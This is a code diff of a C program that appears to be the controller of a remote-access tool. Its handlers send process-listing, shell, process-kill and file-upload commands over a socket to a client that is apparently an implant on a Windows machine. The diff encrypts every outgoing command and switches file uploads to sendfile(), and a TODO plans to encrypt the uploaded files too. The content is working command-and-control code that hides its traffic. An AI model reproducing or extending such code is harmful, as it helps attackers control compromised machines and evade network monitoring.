@@ -6,7 +6,9 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <sys/socket.h>
+#include <sys/sendfile.h>
 #include <sys/select.h>
+#include <sys/stat.h>
 #include <fcntl.h>  
 #include <errno.h>
 #include <termios.h>
@@ -61,7 +63,7 @@ void HandleLspid(char *cmd,int client_socket){
 
 	ssize_t sent_bytes = 0;
 	ssize_t bytes_received = 0;
-	
+	encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
 	sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
 	if (sent_bytes == -1){
 		printf("[x] send() failed\n");
@@ -104,6 +106,7 @@ void HandleShell(char *cmd,int client_socket) {
 
     ssize_t sent_bytes = 0;
     ssize_t bytes_received = 0;
+    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
     
     // Send initial command
     sent_bytes = send(client_socket, cmd, strlen(cmd), 0);
@@ -213,7 +216,8 @@ void HandleStopProcess(char *cmd, int client_socket){
 
     ssize_t sent_bytes = 0;
     ssize_t bytes_received = 0;
-    
+
+    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
     sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
     if (sent_bytes == -1){
         printf("[x] send() failed\n");
@@ -255,55 +259,63 @@ int UploadFile(char *cmd,int client_socket, char * filename, char * FullWindowsP
 
     ssize_t sent_bytes = 0;
     ssize_t bytes_received = 0;
-    
+    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
     sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
     if (sent_bytes == -1){
         printf("[x] send() failed\n");
         return -1;
     }
 
+    // TODO: Encrypt the requested file to a tmp file and send it regularly and delete the tmp file.
 
     // Check if file exists
-    FILE* file = fopen(filename, "rb");
-    if (!file) {
+    //FILE* file = fopen(filename, "rb");
+    int file = open(filename,O_RDONLY);
+    if (file == -1) {
         perror("Failed to open file");
         return -1;
     }
 
-    // Get file size
-    fseek(file, 0, SEEK_END);
-    long file_size = ftell(file);
-    fseek(file, 0, SEEK_SET);
 
-    printf("[+] File size is %lu\n",file_size);
+    // Get file stats 
+    struct stat file_stat;
+    if (fstat(file, &file_stat) < 0)
+    {
+            fprintf(stderr, "Error fstat --> %s", strerror(errno));
+
+            exit(EXIT_FAILURE);
+    }
+
+    fprintf(stdout, "File Size: %ld bytes\n", file_stat.st_size);
+
+    
+
+
     // send file size
-
-    sent_bytes = send(client_socket,&file_size,(size_t) sizeof(file_size),0);
+    char file_size[BUFFER_SIZE];
+    sprintf(file_size, "%ld", file_stat.st_size);
+    sent_bytes = send(client_socket,file_size,(size_t) sizeof(file_size),0);
     if (sent_bytes == -1){
         printf("[x] send() failed\n");
         return -1;
     }
 
+
     //send file data
+    off_t offset = 0;
+    int remain_data = file_stat.st_size;
 
-    char FileBuf[BUFFER_SIZE];
-    long total_sent = 0;
-    int bytes_read = 0;
+    while (((sent_bytes = sendfile(client_socket, file, &offset, BUFFER_SIZE)) > 0) && (remain_data > 0))
+        {
+                fprintf(stdout, "1. Server sent %ld bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data);
+                remain_data -= sent_bytes;
+                fprintf(stdout, "2. Server sent %ld bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data);
+        }
 
-    while ((bytes_read = fread(FileBuf, 1, BUFFER_SIZE, file)) > 0) {
-        send(client_socket, FileBuf, bytes_read, 0);
-        total_sent += bytes_read;
-
-        // Show progress
-        printf("Sent: %ld/%ld bytes (%.2f%%)\r",
-            total_sent, file_size,
-            (double)total_sent / file_size * 100);
-        fflush(stdout);
-    }
     
-    printf("\nFile sent successfully!\n");
+    printf("\n[+] File sent successfully!\n");
 
-    fclose(file);
+    close(file);
 
 
 
